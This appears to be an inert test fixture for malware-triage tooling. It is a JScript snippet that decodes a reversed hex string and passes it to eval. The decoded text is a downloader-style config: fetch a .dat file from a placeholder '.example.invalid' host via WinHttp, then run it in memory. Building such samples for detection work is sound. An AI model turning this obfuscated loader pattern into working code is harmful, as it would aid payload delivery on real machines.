// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decode_afc0d154(v_a19c) {
  var v_b27e = v_a19c.slice(0);
  v_b27e.reverse();
  return v_b27e;
}
function recover_86d9f12b() {
  // configuration reconstruction
  var packedText = "7d:32:3a:22:74:6e:75:6f:43:65:67:61:74:73:22:2c:7d:22:30:39:33:39:35:32:31:38:62:34:2f:62:61:4c:73:73:65:72:74:6e:75:48:22:3a:22:74:6e:65:67:61:5f:72:65:73:75:22:2c:22:74:61:64:2e:36:63:30:36:38:33:64:61:2f:64:69:6c:61:76:6e:69:2e:65:6c:70:6d:61:78:65:2e:30:39:33:39:35:32:31:38:62:34:2f:2f:3a:73:70:74:74:68:22:3a:22:6c:72:75:22:2c:22:30:39:33:39:35:32:31:38:62:34:2d:6e:67:69:61:70:6d:61:63:22:3a:22:64:69:5f:6e:67:69:61:70:6d:61:63:22:7b:3a:22:73:65:75:6c:61:76:22:2c:22:31:2e:35:2e:74:73:65:75:71:65:52:70:74:74:48:6e:69:57:2e:70:74:74:48:6e:69:57:22:3a:22:72:65:74:70:61:64:61:22:2c:5d:22:79:72:6f:6d:65:6d:5f:68:63:74:61:70:73:69:64:22:2c:22:65:74:6f:6d:65:72:5f:65:72:69:75:71:63:61:22:5b:3a:22:73:70:65:74:73:22:7b";
  var packedParts = packedText.split(":");
  var v_a19c = [];
  for (var hi = 0; hi < packedParts.length; hi++) { v_a19c.push(parseInt(packedParts[hi], 16)); }

  var v_b27e = [];
  var pass = 0;
  while (pass < 1) { v_b27e = decode_afc0d154.call(null, v_a19c); pass++; }
  var v_c304 = v_b27e.length ? String.fromCharCode(v_b27e[0]) : "", bi = 1;
  for (bi = 1; bi < v_b27e.length; bi++) { v_c304 = v_c304.concat(String.fromCharCode(v_b27e[bi])); }
  return v_c304;
  // end reconstruction
}
function inspect_ca89d337() {
  var v_d41a = eval("(" + recover_86d9f12b.call(null) + ")");
  return { steps: v_d41a["steps"], adapter: v_d41a["adapter"], values: v_d41a["values"], stageCount: v_d41a["stageCount"] };
}
